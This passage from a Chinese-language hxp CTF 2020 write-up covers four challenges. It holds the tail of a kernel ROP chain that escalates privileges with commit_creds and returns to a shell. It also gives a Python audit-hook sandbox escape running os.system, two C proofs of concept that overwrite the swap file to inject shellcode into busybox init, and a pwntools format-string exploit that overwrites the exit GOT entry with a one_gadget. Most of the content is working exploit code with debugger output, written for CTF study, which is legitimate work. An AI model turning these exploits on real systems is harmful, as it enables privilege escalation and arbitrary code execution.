    rop[off++] = user_sp;
    rop[off++] = user_ss;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] leak prepare_kernel_cred");
}

void call_commit_creds()
{
    __asm__ volatile(
        ".intel_syntax noprefix \n"
        "mov tmp, rax \n"
        ".att_syntax \n"
    );
    cred = tmp;
    unsigned long user_rip = (unsigned long) get_shell;
    
    /* rop */
    unsigned long rop[50];
    int off = (0xa0 - 0x20) / sizeof(unsigned long);
    rop[off++] = canary; // 0x20
    rop[off++] = 0; // 0x18
    rop[off++] = 0; // 0x10
    rop[off++] = 0; // 0x08
    rop[off++] = pop_rdi_ret;
    rop[off++] = cred;
    rop[off++] = commit_creds;
    rop[off++] = swapgs_restore_regs_and_return_to_usermode + 0x16;
    rop[off++] = 0;
    rop[off++] = 0;
    rop[off++] = user_rip;
    rop[off++] = user_cs;
    rop[off++] = user_rflags;
    rop[off++] = user_sp;
    rop[off++] = user_ss;

    if (write(devfd, rop, sizeof(rop)) < 0)
        perror("[-] write dev failed");
    puts("[+] leak prepare_kernel_cred");
}

void exploit()
{
    leak_base();
    leak_commit_creds();
}

int main()
{
    save_status();
    open_dev();
    exploit();
    return 0;
}
```

編譯: `gcc -static -fno-stack-protector -o exp exp.c`

- [參考練習文章](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/#preface)
- [官方 writeup](https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/)
- `gzip -9`: slowest compression method (best compression)
- [Function Granular KASLR](https://lwn.net/Articles/824307/)
- [smallkirby's blogw](https://smallkirby.hatenablog.com/entry/2021/02/16/225125)



### audited

```python
#!/usr/bin/python3 -u

import sys
from os import _exit as __exit

# 可以由 name 來判斷當前 audit event
def audit(name, args):
    # name == exec
    # args == code object
    if not audit.did_exec and name == 'exec':
        audit.did_exec = True
    else:
        __exit(1)
audit.did_exec = False

sys.stdout.write('> ')
try:
    # compile(source, fn, 'exec')
    # source 像是 "for i in range(0,10): print(i)"
    # 也能用 for {} 或是 x = 1 ; y = 2 等等平常 python 不能用的 symbol
    code = compile(sys.stdin.read(), '<user input>', 'exec')
except:
    __exit(1)
sys.stdin.close() # 關閉輸入

for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]

sys.addaudithook(audit)

namespace = {}
try:
    # exec(object[, globals[, locals]])
    exec(code, namespace, namespace)
except:
    __exit(1)
__exit(0)
```

由於 `audit.did_exec == True` 的限制，在第二次發生 audit event 時，會直接執行 `_exit(1)`，因此必須要在不 trigger audit event 的情況下 import module。

而 `exec` 再傳入沒有 `builtins` key 的 global namespace 時，會把 `builtins` 自己加進去，程式可以透過 `__builtins__` 來取得。

- ipy 使用 `__builtins__` 時是當作 module (`__builtins__.__loader__`)，而 `exec` 內部是當作 dict (`__builtins__['__loader__']`)

目標有兩個:

1. bypass audithook 只能執行一次的限制
2. bypass modules 被刪除的限制

關於第一個目標，可以透過 `__builtins__.__loader__.load_module` 來取得 `<bound method _load_module_shim of <class '_frozen_importlib.BuiltinImporter'>>`，這樣就不需要 `import` module，可以在 audithook 不被 trigger 的情況下 import module。

之後透過 gc (garbage collection) 取得被 gc 所追蹤的 object list 來拿到被刪除的 modules:

- Returns a list of all objects tracked by the collector, excluding the list returned. If generation is not None, return only the objects tracked by the collector that are in that generation
- 不過目前 `gc.get_object()` 已經會 trigger audit event 了 (python 3.8.11, python 3.9)

在內部找到 `main` 以及 `os` 後，將 `__exit` 寫為 `lambda x: None` (`_sys.modules['__main__'].__exit = lambda x: None`)，並使用 `os` 來執行 command。



而另一個方法則不受 `gc.get_object()` 被加入 audit event 所限制，先使用常見的 python sandbox 取得所有 module 的 payload `''.__class__.__base__.__subclasses__()`，而某些 module 會使用 sys 作為 built-in function，因此需要找出該 module offset:

- python 3.8 的 `__globals__[]` 會讓 `object.__getattr__` audit event 叫，但是 python 3.9 卻不會 (?)

```python
#!/usr/bin/python3

classes = ''.__class__.__base__.__subclasses__()
module_list = {}

for (i, v) in enumerate(classes):
    if '__globals__' not in dir(v.__init__):
        continue
    if 'sys' not in module_list and 'sys' in v.__init__.__globals__:
        module_list['sys'] = {
            'offset': i,
            'module': v.__init__.__globals__['sys']
        }
    if 'os' not in module_list and 'os' in v.__init__.__globals__:
        module_list['os'] = {
            'offset': i,
            'module': v.__init__.__globals__['os']
        }
    if '_os' not in module_list and '_os' in v.__init__.__globals__:
        module_list['_os'] = {
            'offset': i,
            'module': v.__init__.__globals__['_os']
        }
    # if '__builtins__' not in module_list and '__builtins__' in v.__init__.__globals__:
    #     module_list['__builtins__'] = {
    #         'offset': i,
    #         'module': v.__init__.__globals__['__builtins__']
    #     }
    
print(module_list)
```

但是 modules 被刪掉，沒辦法透過 `''.__class__.__base__.__subclasses__()[80].__init__.__globals__['sys'].modules['__main__'].__exit = lambda x: None` 此種方式來取得 `main` 並蓋寫 exit，此時可以透過 `try:... except: sys.exc_info` 取得 call flow，

- `sys.exc_info()` 回傳三個 value `(type, value, traceback)`
  - `traceback.tb_frame`: points to the execution frame of the current level
    - Accessing `tb_frame` raises an auditing event `object.__getattr__` with arguments obj and "tb_frame"
    - `tb_frame.f_back`: `f_back` is to the previous stack frame (towards the caller)
    - `tb_frame.f_globals`: used for global variables



不過因為 `tb_frame` 現在會 trigger `__getattr__`，因此現在也無法 work 了，以下為 payload:

```python
os = ''.__class__.__base__.__subclasses__()[99].__init__.__globals__['_os']
sys = ''.__class__.__base__.__subclasses__()[80].__init__.__globals__['sys']

try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    fr = tb.tb_frame

    while fr:
        if 'audit' in fr.f_globals:
            break
        fr = fr.f_back
    
    fr.f_globals['__exit'] = lambda x: None
    os.system('ls')
```



- `-u`: Force the stdout and stderr streams to be unbuffered.  This option has no effect on the stdin stream
- `addaudithook(hook)`: 將 callback function 以 hook 的形式加到 interpreter 的執行過程
  - Append the callable hook to the list of active auditing hooks for the current (sub)interpreter
  - [audit events table](https://docs.python.org/3/library/audit_events.html#audit-events)
- `exec(code, {}, {})`: If the globals dictionary does not **contain a value for the key builtins**, a reference to the dictionary of the built-in module builtins is inserted under that key
  - 代表 builtin function 可以用，像是 `__import__('os')` 也可以
- 題目沒有提供 python 的環境，因此 payload 應該在舊的 python 環境才能 work，比較新的 python 應該都被擋掉了



### pfopten

run.sh

```bash
#!/bin/bash

qemu-system-x86_64 \
    -smp 1 -m 100M \
    -kernel vmlinuz \
    -append "console=ttyS0 quiet ip=dhcp" \
    -initrd initramfs.cpio.gz \
    -fda flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot
```

/etc/init.d/rcS

```bash
#!/bin/sh

/bin/busybox --install -s

stty raw -echo

chown -R 0:0 /

mkdir -p /proc && mount -t proc none /proc
mkdir -p /dev  && mount -t devtmpfs devtmpfs /dev
mkdir -p /tmp  && mount -t tmpfs tmpfs /tmp

umask 111

dd if=/dev/zero bs=1M count=10 of=/swap status=none
losetup /dev/loop0 /swap
mkswap /dev/loop0 >/dev/null
swapon /dev/loop0 >/dev/null
```

- `dd`
  - `bs`: block size
- `losetup <loop_device> <file>`: loop device 為 pseudo device，能夠與某個檔案連接，而後能將檔案給 mount 起來做存取
- `mkswap <device>`: 指定 device 為 swap space
- `swapon <device>`: 開啟 device 做 swap

而 `swap` 為 writable `-rw-rw-rw- 1 0 0 10485760 Jul 19 18:07 swap`，並且當在 kernel 使用過多 memory (`mmap` + `MAP_SHARED`)，kernel 確實會把部分的 memory swap 到 `/swap`，POC 如下:

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    for (int i = 1; i <= 100; i++) {
        // 0x100000 == 1024*1024 == 1MB
        // all memory is 100MB
        void *mem = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        
        memset(mem, i, 0x100000);
        printf("%d\n", i);
        system("strings /swap");
    }
    getchar();

    return 0;
}
```

而在 40MB 後開始出現 `busybox` 的 binary content:

```
Internal Server Error
Entity Too Large
index.html
HTTP/1.0 200 OK
log/supervise/stat
log/supervise/status.new
log/supervise/status
, got TERM
write 
%s: fatal: %s exists but is not a fifo
start log/
start 
./finish
./run
vfork, sleeping
stat ./log
stat log/down: log is not a directory
log/down
: name too long
readlink ./supervise
lock supervise/lock
readlink ./log/supervise
change back to service directory
lock log/supervise/lock
```

而 `busybox` 為 init process，此代表有 root 權限的 `init` 被 swap 出去，猜想是否能透過改寫 `/swap` 來讓 linux 將 init swap 回去後變成可控的 binary。有三種可能的攻擊方式:

1. 將 kernel heap swap 出去，並改寫 kernel heap 上的 `cred` 做提權
2. 將 `init` swap 出去，並改寫成任意 shellcode 做 exploit
3. 將 kernel code swap 出去，並改寫成任意 shellcode 做 exploit

不過 linux swap 的資料通常是不被頻繁使用的，因此在執行 exploit 過程中不能被執行，並且當資料被更改過後，必須可以被利用。

而 kernel heap 會很常被使用到，因此不考慮；在 POC 時已經看到 `busybox` 的 binary string 了，因此可以確定 `init ` (實際上執行 `sh -> busybox`) 確實有被 swap 出去。並且 linux 會為了節省 physical memory 的使用空間，將 read-only (code section) 的 memory page 給多個 process 使用，因此我們能確定改到 `init` read-only page，並且會連帶影響後續執行 `busybox` 的情況。得出 exploit 步驟:

- allocate memory 直到 `busybox` 被 swap 出來
- 找到 `busybox` 中可以定位的 byte stream 或是字串，再透過 offset 去找到要修改的位置
- 修改完畢後，執行修改到的 command

而 `exit()` 雖位於 `0x4D1277`，可是 shellcode 卻會在 `0x4D12A7` 被執行，猜測是 `init` 在 `0x4D12A4` 執行 `SYS_poll` syscall 後 return，因此必須知道 return 的位置，在去 overwrite 那邊的 shellcode。

但是這會遇到 `init` 的 stack 也被 `swap` 掉 (?)，導致 return 時會 trigger segmentation fault:

```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────
*RAX  0x4e
*RBX  0x0
 RCX  0x4d12a6 ◂— ret    
 RDX  0x0
*RDI  0xffffffffffffffff
 RSI  0x0
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x246
 R12  0x0
*R13  0x405914 ◂— sub    rsp, 0x18
*R14  0x0
 R15  0x0
*RBP  0xffffffff
*RSP  0x7ffce3627288
 RIP  0x4d12a6 ◂— ret    
────────────────────────────────────────────
 ► 0x4d12a6    ret    
 
   0x4d12a7    cmp    edi, 0xe
   0x4d12aa    jne    0x4d12d1 <0x4d12d1>
    ↓
   0x4d12d1    mov    edx, edi
   0x4d12d3    movzx  ecx, di
   0x4d12d6    sar    edx, 0x10
   0x4d12d9    cmp    ecx, 0xffff
   0x4d12df    jne    0x4d1306 <0x4d1306>
    ↓
   0x4d1306    cmp    edx, 2
   0x4d1309    je     0x4d1331 <0x4d1331>
    ↓
   0x4d1331    cmp    ecx, 0x31
────────────────────────────────────────────
<Could not read memory at 0x7ffce3627288>
────────────────────────────────────────────
 ► f 0         0x4d12a6
────────────────────────────────────────────
pwndbg> 
```

可以看到 stack 位置已經跑掉了:

```
pwndbg> vmmap
...
          0x502000           0x504000 r-xp     2000 0      <qemu>
          0x703000           0x704000 r-xp     1000 0      <qemu>
    0x7ffce3646000     0x7ffce3647000 r-xp     1000 0      <qemu>
    0x7ffce364a000     0x7ffce364b000 r-xp     1000 0      <qemu>
0xffff89e740000000 0xffff89e740099000 rwxp    99000 0      <qemu>
...
```

但是有時候 payload 可以 work，猜測 stack 歪掉的原因是 `swap` 時出了問題。以下 exploit 為概念的 PoC，實際運作可能會因為環境而失敗:

`mmap()` 版本:

```c
#define _GNU_SOURCE 
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define PAGE_1MB_SIZE 0x100000
#define MB_10 0xa00000
#define MAP_LIST_SIZE 0x80

/*
mov rax, 2 
xor rdi, rdi 
push rdi 
mov rdi, 0x3064662f7665642f # /dev/fd0
push rdi 
mov rdi, rsp 
xor rsi, rsi 
syscall 
 
mov rdi, rax 
xor rax, rax 
mov rsi, rsp 
mov rdx, 0x30 
syscall 
 
mov rax, 1
mov rdi, 1
syscall

mov rax, 60
mov rdi, 1
syscall
*/
char sc[] = {0x48, 0xc7, 0xc0, 0x2, 0x0, 0x0, 0x0, 0x48, 0x31, 0xff, 0x57, 0x48,
            0xbf, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x66, 0x64, 0x30, 0x57, 0x48,
            0x89, 0xe7, 0x48, 0x31, 0xf6, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x48,
            0x31, 0xc0, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc2, 0x30, 0x0, 0x0, 0x0,
            0xf, 0x5, 0x48, 0xc7, 0xc0, 0x1, 0x0, 0x0, 0x0, 0x48, 0xc7, 0xc7,
            0x1, 0x0, 0x0, 0x0, 0xf, 0x5, 0x48, 0xc7, 0xc0, 0x3c, 0x0, 0x0, 0x0,
             0x48, 0xc7, 0xc7, 0x1, 0x0, 0x0, 0x0, 0xf, 0x5};

/*
movsxd  rdi, edi
mov     eax, 0E7h
syscall
mov     edx, 3Ch
mov     rax, rdx
syscall
*/
char needed[] = {0x48, 0x63, 0xff, 0xb8, 0xe7, 0x0, 0x0, 0x0, 0xf, 0x5, 0xba, 0x3c, 0x0, 0x0, 0x0, 0x48, 0x89, 0xd0, 0xf, 0x5};
void *map_list[MAP_LIST_SIZE] = {0};

int main()
{
    int fd = open("/swap", O_RDWR);
    if (fd == -1) {
        printf("open failed\n");
        exit(1);
    }
    if (ftruncate(fd, MB_10) == -1) {
        printf("ftruncate failed\n");
        exit(1);
    }
    unsigned char *swap = mmap(NULL, MB_10, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    if (swap == NULL) {
        printf("mmap failed\n");
        exit(1);
    }

    for (int i = 1; i <= 0x1000; i++) {
        printf("Round %d\n", i);
        map_list[i-1] = mmap(NULL, PAGE_1MB_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        memset(map_list[i-1], 'A', PAGE_1MB_SIZE);
        
        if (msync(swap, MB_10, MS_SYNC) == -1) {
            printf("ftruncate failed\n");
            exit(1);
        }

        unsigned char *ptr;
        if ((ptr = memmem(swap, MB_10, needed, sizeof(needed))) != NULL) {
            printf("FOUND !\n");
            memcpy(ptr, sc, sizeof(sc));
            break;
        }

        if (i != 1 && i-1 % MAP_LIST_SIZE == 0) {
            for (int j = 0; j < MAP_LIST_SIZE; j++) {
                munmap(map_list[j], PAGE_1MB_SIZE);
            }
        }
    }

    munmap(swap, MB_10);
    close(fd);

    return 0;
}
```

fd 版本:

```c
#define _GNU_SOURCE 
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define PAGE_1MB_SIZE 0x100000
#define MB_10 0xa00000

/*
mov rax, 2 
xor rdi, rdi 
push rdi 
mov rdi, 0x3064662f7665642f # /dev/fd0
push rdi 
mov rdi, rsp 
xor rsi, rsi 
syscall 
 
mov rdi, rax 
xor rax, rax 
mov rsi, rsp 
mov rdx, 0x30 
syscall 
 
mov rax, 1
mov rdi, 1
syscall

mov rax, 60
mov rdi, 1
syscall
*/
unsigned char sc[] = {0x48, 0xc7, 0xc0, 0x2, 0x0, 0x0, 0x0, 0x48, 0x31, 0xff, 0x57, 0x48,
            0xbf, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x66, 0x64, 0x30, 0x57, 0x48,
            0x89, 0xe7, 0x48, 0x31, 0xf6, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x48,
            0x31, 0xc0, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc2, 0x30, 0x0, 0x0, 0x0,
            0xf, 0x5, 0x48, 0xc7, 0xc0, 0x1, 0x0, 0x0, 0x0, 0x48, 0xc7, 0xc7,
            0x1, 0x0, 0x0, 0x0, 0xf, 0x5, 0x48, 0xc7, 0xc0, 0x3c, 0x0, 0x0, 0x0,
            0x48, 0xc7, 0xc7, 0x1, 0x0, 0x0, 0x0, 0xf, 0x5};

/*
movsxd  rdi, edi
mov     eax, 0E7h
syscall
mov     edx, 3Ch
mov     rax, rdx
syscall
*/
unsigned char needed[] = {0x48, 0x63, 0xFF, 0xB8, 0xE7, 0x00, 0x00, 0x00, 0x0F,
                            0x05, 0xBA, 0x3C, 0x00, 0x00, 0x00};

int main()
{
    if (swap == NULL) {
        printf("malloc failed\n");
        exit(1);
    }

    for (int i = 1; i <= 0x1000; i++) {
        void *mem = mmap(NULL, PAGE_1MB_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        memset(mem, 'A', PAGE_1MB_SIZE);
        
        int fd = open("/swap", O_RDWR);
        read(fd, swap, MB_10);

        unsigned char *ptr;
        if ((ptr = memmem(swap, MB_10, needed, sizeof(needed))) != NULL) {
            printf("FOUND !\n");
            lseek(fd, ptr-swap, SEEK_SET);
            write(fd, sc, sizeof(sc));
            close(fd);

            break;
        }
        close(fd);
    }
    free(swap);

    return 0;
}
```



- `init` 會去讀 `/etc/inittab` 作為設定檔，並依照內容依序啟動 process

  ```
  ::sysinit:/etc/init.d/rcS
  ::once:-setuidgid 1 sh
  ```

- `grep -ir pagesize /proc/1/smaps` 用來看 page size，基本上為 4 KB



### still-printf

```
// file
still-printf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f2cefe2bcfe57d69bf54ad1fce3e0ad5f9969980, for GNU/Linux 3.2.0, stripped

// checksec
[*] '/home/u1f383/tmp/hxpctf_2020/still-printf-d20188c31d06a593/still-printf/still-printf'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程式邏輯很簡單，存在 fmt 漏洞，不過執行後會馬上 `exit()` :

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	char buf[0x30]; // 48
	setbuf(stdout, NULL);
	fgets(buf, sizeof(buf), stdin);
	printf(buf);
	exit(0);
}
```

分別在 `15$` 以及 `41$` 有 rbp chain 可以使用，但是 [vfprintf 原始碼](https://elixir.bootlin.com/glibc/glibc-2.28/source/stdio-common/vfprintf.c#L1337)上記錄，當第一次遇到 `$` 時代表 fmt 中含有 positional parameter，會去 LABEL `do_positional` 執行 `printf_positional()`，並且將後續 `XX$` 對應到的 value 存到 `args_value` 做處理，因此一個 format string 中沒辦法透過 positional parameter 來完成 rbp chain，因此第一個 chain gadget `15$` 必須使用當前 fmt 對應的 parameter 完成。

而因為 `exit()` 的關係，因此 fmt 要蓋的 return address 為 `printf()` 的 return address，不過因為 stack 的位置受 ASLR 影響，因此必須猜 0x1000 次 (1.5 bytes random)，才能改到正確的 `41$`，而 `41$` 只需要透過 partial overwrite 就能把 return address 蓋成 main 中 `fgets` 的位置，因此不需要撞機率。

在第二次 `fgets`，就透過 partial overwrite exit_got 成 one gadget 即可，並且因為 payload 大小只能到 0x2f，因此用 `$hn` + `$h` 會剛好符合字數限制，以下為 exploit:

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

# r = process("./S", env={"LD_PRELOAD": "./libc-2.28.so"})
# gdb.attach(r, """
# dir /usr/src/glibc/glibc-2.28:/usr/src/glibc/glibc-2.28/stdio-common
# # b *printf_positional
# # b *vfprintf
# # b *vfprintf+7215
# # b *printf+189
# # c
# """)


while True:
    r = process("./S", env={"LD_PRELOAD": "./libc-2.28.so"})

    rbp1 = 15
    rbp2 = 41
    has_printed = 0

    fmt = "%c" # rsi
    has_printed += 1

    # leak stack
    fmt += "%p" # rdx
    has_printed += 14 # 0xFFFFFFFFFF

    fmt += "%c" # rcx
    has_printed += 1

    fmt += "%*c" # r8, r9
    has_printed += 1

    fmt += "%c"*6
    has_printed += 6

    # leak code
    fmt += "%p"
    has_printed += 14

    # leak libc
    fmt += "%p"
    has_printed += 14

    fmt += f"%{0xed38 - has_printed}c%hn" # 15$

    # 0x10DD == fgets()
    fmt += f"%{0xdd - 0x38}c%41$hhn" # 41$, use positional parameter

    r.send(fmt)
    r.recvuntil('0x')
    stack = int(r.recv(12), 16)
    info(f"stack: {hex(stack)}")

    r.recvuntil('0x')
    code = int(r.recv(12), 16) - 0x1200
    info(f"code: {hex(code)}")
    exit_got = code + 0x3380

    r.recvuntil('0x')
    libc = int(r.recv(12), 16) - 0x2409b
    # 0x50186, 0x501e3, 0x103f50, 0x50186, 0x501ef, 0xdf1ee, 0xdf1f1
    one = libc + 0xdf1f1
    info(f"libc: {hex(libc)}")
    info(f"one: {hex(one)}")

    if (stack & 0xffff) != 0xed40:
        info("[-] not lucky, try again")
        r.close()
        continue

    written = 0
    def next_payload(n, bits):
        global written
        written_mask = written & ((1 << bits) - 1)

        if written_mask < n:
            written += n - written_mask
            return n - written_mask
        else:
            written += ((1 << bits) - written_mask) + n
            return ((1 << bits) - written_mask) + n

    payload = b''
    payload += ("%" + str(next_payload(one & 0xffff, 16)) + "c%10$hn").encode()
    payload += ("%" + str(next_payload((one & 0xffffffff) >> 16, 16)) + "c%11$hn").encode()
    payload = payload.ljust(0x20, b'\x00')
    payload += p64(exit_got) + p64(exit_got + 2)[:-1] # 10$, 11$
    r.send(payload)
    print("--- Lucky! ---")
    r.interactive()
    break
```



- format string 的格式為 `%[parameter][flags][field width][.precision][length]type`
  - `%` 為 prefix
  - `%XX$n`: `XX$`被稱作 positional parameter，而 `n` 為 type
- `%XXX%hn` 是透過 `#define process_arg(fspec)` (stdio-common/vfprintf.c) 來完成的
  - 一個在 `vfprintf()` 內 - https://elixir.bootlin.com/glibc/glibc-2.28/source/stdio-common/vfprintf.c#L1637
  - 一個在 `printf_positional()` 內 - https://elixir.bootlin.com/glibc/glibc-2.28/source/stdio-common/vfprintf.c#L2017
- 可以使用 `%*c` 來多使用一個 parameter
- fmt 除了蓋 main 的 return 之外，也朝蓋 glibc function return address 的方向來思考

